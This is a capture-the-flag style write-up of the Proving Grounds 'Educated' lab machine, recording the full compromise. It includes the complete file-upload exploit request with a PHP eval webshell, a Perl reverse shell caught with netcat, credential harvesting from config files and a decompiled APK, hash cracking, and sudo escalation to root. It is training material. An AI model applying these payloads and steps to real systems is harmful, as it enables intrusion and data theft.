`Running all scans on 192.168.190.13`

`Host is likely running Unknown OS!`

`---------------------Starting Port Scan-----------------------`

`PORT   STATE SERVICE`
`22/tcp open  ssh`
`80/tcp open  http`

`---------------------Starting Script Scan-----------------------`

`PORT   STATE SERVICE VERSION`
`22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)`
`| ssh-hostkey:` 
`|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)`
`|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)`
`|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)`
`80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))`
`|_http-title: Wisdom Elementary School`
`|_http-server-header: Apache/2.4.41 (Ubuntu)`
`Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`

Do a Fuzz scan

`└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://192.168.151.13/FUZZ -fc 403`

        `/'___\  /'___\           /'___\`       
       `/\ \__/ /\ \__/  __  __  /\ \__/`       
       `\ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\`      
        `\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/`      
         `\ \_\   \ \_\  \ \____/  \ \_\`       
          `\/_/    \/_/   \/___/    \/_/`       

       `v2.1.0-dev`
`________________________________________________`

 `:: Method           : GET`
 `:: URL              : http://192.168.151.13/FUZZ`
 `:: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt`
 `:: Follow redirects : false`
 `:: Calibration      : false`
 `:: Timeout          : 10`
 `:: Threads          : 40`
 `:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500`
 `:: Filter           : Response status: 403`
`________________________________________________`

`assets                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 31ms]`
`.                       [Status: 200, Size: 23698, Words: 7065, Lines: 559, Duration: 36ms]`
`management              [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 41ms]`
`vendor                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 26ms]`
`:: Progress: [63088/63088] :: Job [1/1] :: 1020 req/sec :: Duration: [0:01:01] :: Errors: 0 ::`

/management has a login

![[Pasted image 20240210164026.png]]

No weak credentials. 

Feroxbuster finds an install file with some default credentials and the database.sql file with the table layout.

`200      GET       36l      221w     1446c http://192.168.151.13/management/installation/install_guide.txt`
`200      GET     1156l     5239w    47297c http://192.168.151.13/management/installation/sql/database.sql`

No luck with the default credentials unfortunately.

![[Pasted image 20240210195638.png]]

https://www.exploit-db.com/exploits/50587

This exploit says through /admin/manage_profile we can upload a php webshell. We can't access that page though.
It says the exploit would upload to /uploads/exam_question directory and we do have access to that.

Reading a little further, it shows the actual request goes to /admin/examQuestion/create

![[Pasted image 20240210203529.png]]

We do have access to this so let's try to manually do the exploit.
Download the exploit, replace the "localhost" and fix the line breaks.

```txt
POST /management/admin/examQuestion/create HTTP/1.1
Host: 192.168.151.13
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data;boundary=---------------------------183813756938980137172117669544
Content-Length: 1331
Origin: http://192.168.151.13
Connection: close
Referer: http://192.168.151.13/admin/examQuestion
Cookie: ci_session=793aq6og2h9mf5cl2q2b3p4ogpcslh2q
Upgrade-Insecure-Requests: 1

-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="name"

test4
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="class_id"

2
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="subject_id"

5
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="timestamp"

2021-12-08
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="teacher_id"

1
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="file_type"

txt
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="status"

1
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="description"

123123
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="_wysihtml5_mode"

1
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="file_name"; filename="cmd.php"
Content-Type: application/octet-stream

<?php eval($_GET["cmd"]); ?>
-----------------------------183813756938980137172117669544--
```

Paste the request into burp

![[Pasted image 20240210203910.png]]

![[Pasted image 20240210203929.png]]

Check if it worked
![[Pasted image 20240210204022.png]]

Success! Now let's upload a reverse shell.

I used this one - http://pentestmonkey.net/tools/perl-reverse-shell/perl-reverse-shell-1.0.tar.gz

![[Pasted image 20240210204357.png]]
`└─$ python -m http.server 80 --directory /home/user/Downloads/`
`Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...`
`192.168.151.13 - - [10/Feb/2024 20:42:59] "GET /perl_shell.pl HTTP/1.1" 200 -`

![[Pasted image 20240210204452.png]]

Catch and upgrade
`└─$ nc -nlvp 1234`
`Ncat: Version 7.94SVN ( https://nmap.org/ncat )`
`Ncat: Listening on [::]:1234`
`Ncat: Listening on 0.0.0.0:1234`
`Ncat: Connection from 192.168.151.13:36758.`
 `01:44:30 up  4:49,  2 users,  load average: 0.00, 0.08, 0.98`
`USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT`
`msander  pts/2    192.168.45.235   22:47    2:49m  0.06s  0.06s -bash`
`emiller  pts/3    192.168.45.235   23:41    2:01m  0.03s  0.01s sshd: emiller [priv]`
`Linux school 5.4.0-146-generic #163-Ubuntu SMP Fri Mar 17 18:26:02 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux`
`uid=33(www-data) gid=33(www-data) groups=33(www-data)`
`/`
`/usr/sbin/apache: 0: can't access tty; job control turned off`
`$` 

`$ python3 -c 'import pty; pty.spawn("/bin/bash")'`
`www-data@school:/$` 

Running linpeas, it finds the database password
`╔══════════╣ Searching passwords in config PHP files`
`/var/www/html/management/application/config/database.php:	'password' => '@jCma4s8ZM<?kA',`

Look in that file for the login
	`'hostname' => 'localhost',`
	`'username' => 'school',`
	`'password' => '@jCma4s8ZM<?kA',`
	`'database' => 'school_mgment',`
	`'dbdriver' => 'mysqli',`

Connect to the database
`www-data@school:/tmp$ mysql -u school -p`
`mysql -u school -p`
`Enter password: @jCma4s8ZM<?kA`

`Welcome to the MySQL monitor.  Commands end with ; or \g.`
`Your MySQL connection id is 167`
`Server version: 8.0.32-0ubuntu0.20.04.2 (Ubuntu)`

`Copyright (c) 2000, 2023, Oracle and/or its affiliates.`

`Oracle is a registered trademark of Oracle Corporation and/or its`
`affiliates. Other names may be trademarks of their respective`
`owners.`

`Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.`

`mysql>` 



`mysql> show databases;`
`show databases;`
`+--------------------+`
`| Database           |`
`+--------------------+`
`| information_schema |`
`| mysql              |`
`| performance_schema |`
`| school_mgment      |`
`| sys                |`
`+--------------------+`
`5 rows in set (0.01 sec)`

`mysql> use school_mgment;`
`use school_mgment;`
`Reading table information for completion of table and column names`
`You can turn off this feature to get a quicker startup with -A`

`Database changed`
`mysql>` 

Check which tables have a "password" column

`mysql> select table_name`
`select table_name`
    `-> from information_schema.columns`
`from information_schema.columns`
    `-> where table_schema = 'school_mgment'`
`where table_schema = 'school_mgment'`
    `-> and column_name = 'password';`
`and column_name = 'password';`
`+------------+`
`| TABLE_NAME |`
`+------------+`
`| admin      |`
`| parent     |`
`| student    |`
`| teacher    |`
`+------------+`
`4 rows in set (0.00 sec)`

We get these 3 passwords from the tables

Formed the select statements to only get the important columns to make the output readable
`select teacher_id,name,email,password from teacher where password is not null and password !="";`

Admin table
`1 | Administrator | admin@school.pg | 07133445656 | 9be3a2dd3a71f3ccc7cc7eb3a5dd997f`
Student table
`45 | Testing Student | student@student.com | 8110eda4d09e062aa5e4a390b0a572ac0d2c0220` 
Teacher table
`1 | Testing Teacher | michael_sander@school.pg | 3db12170ff3e811db10a76eadd9e9986e3c1a5b7`

We were able to crack the teacher's hash
`Loaded 1 password hash (raw-SHA1-opencl [SHA1 OpenCL])`
`Note: This format may be a lot faster with --mask acceleration (see doc/MASK).`
`LWS=128 GWS=2097152`
`Press Ctrl-C to abort, or send SIGUSR1 to john process for status`
`greatteacher123  (?)`     
`1g 0:00:00:00 DONE (2024-02-10 21:07) 1.543g/s 12945Kp/s 12945Kc/s 12945KC/s greatteacher123..ejrhay`
`Use the "--show --format=raw-SHA1-opencl" options to display all of the cracked passwords reliably`
`Session completed.` 

Looking on the system, it might be for the msander user
`www-data@school:/home$ ls -l`
`ls -l`
`total 8`
`drwxr-xr-x 4 emiller emiller 4096 Feb 10 23:42 emiller`
`drwxr-xr-x 4 msander msander 4096 Feb 10 22:49 msander

It is and we can ssh with it
`└─$ ssh msander@192.168.151.13`
`Warning: Permanently added '192.168.151.13' (ED25519) to the list of known hosts.`
`msander@192.168.151.13's password:` 
`Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-146-generic x86_64)`

 * `Documentation:  https://help.ubuntu.com`
 * `Management:     https://landscape.canonical.com`
 * `Support:        https://ubuntu.com/advantage`

  `System information as of Sun 11 Feb 2024 02:09:30 AM UTC`

  `System load:  0.0               Processes:               257`
  `Usage of /:   61.4% of 9.75GB   Users logged in:         2`
  `Memory usage: 54%               IPv4 address for ens160: 192.168.151.13`
  `Swap usage:   0%`


 * `Introducing Expanded Security Maintenance for Applications.`
   `Receive updates to over 25,000 software packages with your`
   `Ubuntu Pro subscription. Free for personal use.`

     `https://ubuntu.com/pro`

`Expanded Security Maintenance for Applications is not enabled.`

`0 updates can be applied immediately.`

`Enable ESM Apps to receive additional future security updates.`
`See https://ubuntu.com/esm or run: sudo pro status`


`The list of available updates is more than a week old.`
`To check for new updates run: sudo apt update`
`Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings`


`Last login: Sat Feb 10 22:47:08 2024 from 192.168.45.235`
`msander@school:~$` 

If we run lse.sh, it shows we can access emiller's home directory which is strange.

`fst080 Can we read subdirectories under /home?......................... yes!`

`total 28`
`drwxr-xr-x 4 emiller emiller 4096 Feb 10 23:42 .`
`drwxr-xr-x 4 root    root    4096 Mar 31  2023 ..`
`lrwxrwxrwx 1 emiller emiller    9 Mar 31  2023 .bash_history -> /dev/null`
`-rw-r--r-- 1 emiller emiller  220 Feb 25  2020 .bash_logout`
`-rw-r--r-- 1 emiller emiller 3771 Feb 25  2020 .bashrc`
`drwx------ 2 emiller emiller 4096 Feb 10 23:41 .cache`
`drwxr-xr-x 2 emiller emiller 4096 Mar 31  2023 development`
`-rw-r--r-- 1 emiller emiller  807 Feb 25  2020 .profile`

There is an apk in the development folder
`msander@school:/home/emiller/development$ ls -ltra`
`total 4652`
`drwxr-xr-x 2 emiller emiller    4096 Mar 31  2023 .`
`-rw-r----- 1 emiller staff   4755263 Mar 31  2023 grade-app.apk`
`drwxr-xr-x 4 emiller emiller    4096 Feb 10 23:42 ..`

Let's get that file and see what's in it

`scp msander@192.168.151.13:/home/emiller/development/grade-app.apk /home/user/Offsec/ProvingGrounds/Educated/grade-app.apk`

There is a built in app called apktool in Kali, use that to decompile it.
`apktool d ~/Offsec/ProvingGrounds/Educated/grade-app.apk`

cd into that directory and grep for password
`┌──(user㉿kalipurple)-[~/Offsec/ProvingGrounds/Educated/grade-app]`
`└─$ grep -r "password" 2>/dev/null`

We get a hit
`res/values/strings.xml:    <string name="temp_password">EzPwz2022_dev1$$23!!</string>`

If we cat this file, at the bottom we find it's the password for e.miller who was the other user we found earlier
![[Pasted image 20240210212105.png]]

We can ssh with this password

`└─$ ssh emiller@192.168.151.13`                                                                                                
`emiller@192.168.151.13's password:` 
`Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-146-generic x86_64)`

 * `Documentation:  https://help.ubuntu.com`
 * `Management:     https://landscape.canonical.com`
 * `Support:        https://ubuntu.com/advantage`

  `System information as of Sun 11 Feb 2024 02:21:27 AM UTC`

  `System load:  0.0               Processes:               260`
  `Usage of /:   61.4% of 9.75GB   Users logged in:         2`
  `Memory usage: 52%               IPv4 address for ens160: 192.168.151.13`
  `Swap usage:   0%`


 * `Introducing Expanded Security Maintenance for Applications.`
   `Receive updates to over 25,000 software packages with your`
   `Ubuntu Pro subscription. Free for personal use.`

     `https://ubuntu.com/pro`

`Expanded Security Maintenance for Applications is not enabled.`

`0 updates can be applied immediately.`

`Enable ESM Apps to receive additional future security updates.`
`See https://ubuntu.com/esm or run: sudo pro status`


`The list of available updates is more than a week old.`
`To check for new updates run: sudo apt update`
`Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings`


`Last login: Sat Feb 10 23:41:57 2024 from 192.168.45.235`
`emiller@school:~$` 

Check sudo -l and he can sudo anything
`emiller@school:~$ sudo -l`
`[sudo] password for emiller:` 
`Matching Defaults entries for emiller on school:`
    `env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin`

`User emiller may run the following commands on school:`
    `(ALL : ALL) ALL`


Sudo and grab the flag
`emiller@school:~$ sudo su -`
`root@school:~# cat /root/proof.txt`
`08a318871bc2ea6d391b9ea78eff5bfe`
`root@school:~# cat /home/msander/local.txt`
`f4d31abfd7fc2a2b4ff74da56f1b91c4`
